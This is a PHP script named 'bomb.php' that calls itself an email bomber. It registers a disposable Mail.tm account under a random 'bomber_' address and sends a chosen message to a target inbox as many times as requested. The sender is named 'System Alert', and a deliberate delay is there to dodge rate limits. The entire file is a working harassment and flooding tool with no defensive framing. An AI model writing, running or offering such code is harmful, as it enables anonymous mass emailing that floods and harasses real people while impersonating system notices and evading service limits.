<?php
// bomb.php - No-login email bomber using Mail.tm API
header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo json_encode(['ok' => false, 'error' => 'POST only']); exit;
}

$target  = trim($_POST['target'] ?? '');
$subject = trim($_POST['subject'] ?? '');
$message = $_POST['message'] ?? '';
$count   = (int)($_POST['count'] ?? 10);

if (!filter_var($target, FILTER_VALIDATE_EMAIL) || $subject === '' || $count < 1) {
    echo json_encode(['ok' => false, 'error' => 'bad input']); exit;
}

// Mail.tm free API (No registration required)
// Docs: https://docs.mail.tm/
$apiBase = 'https://api.mail.tm';

function req($url, $method = 'GET', $data = null, $token = null) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
    $headers = ['Content-Type: application/json'];
    if ($token) $headers[] = "Authorization: Bearer $token";
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    if ($data) curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    $res = curl_exec($ch);
    curl_close($ch);
    return json_decode($res, true);
}

// 1. Get domains
$domains = req("$apiBase/domains");
if (!isset($domains['hydra:member'][0]['domain'])) {
    echo json_encode(['ok' => false, 'error' => 'API down']); exit;
}
$domain = $domains['hydra:member'][0]['domain'];

// 2. Create temp account
$email = 'bomber_' . rand(10000, 99999) . '@' . $domain;
$pass  = bin2hex(random_bytes(8));
$acc = req("$apiBase/accounts", 'POST', ['address' => $email, 'password' => $pass]);
if (!isset($acc['id'])) {
    echo json_encode(['ok' => false, 'error' => 'Acc create failed']); exit;
}

// 3. Login to get token
$login = req("$apiBase/token", 'POST', ['address' => $email, 'password' => $pass]);
if (!isset($login['token'])) {
    echo json_encode(['ok' => false, 'error' => 'Login failed']); exit;
}
$token = $login['token'];

// 4. Send emails in a loop
$sent = 0;
for ($i = 0; $i < $count; $i++) {
    $payload = [
        'from' => ['address' => $email, 'name' => 'System Alert'],
        'to' => [['address' => $target]],
        'subject' => $subject,
        'text' => $message
    ];
    $res = req("$apiBase/messages", 'POST', $payload, $token);
    if (isset($res['id'])) $sent++;
    
    // Spam control: delay to avoid rate limits (1 sec)
    if ($i < $count - 1) sleep(1);
}

echo json_encode(['ok' => true, 'sent' => $sent]);
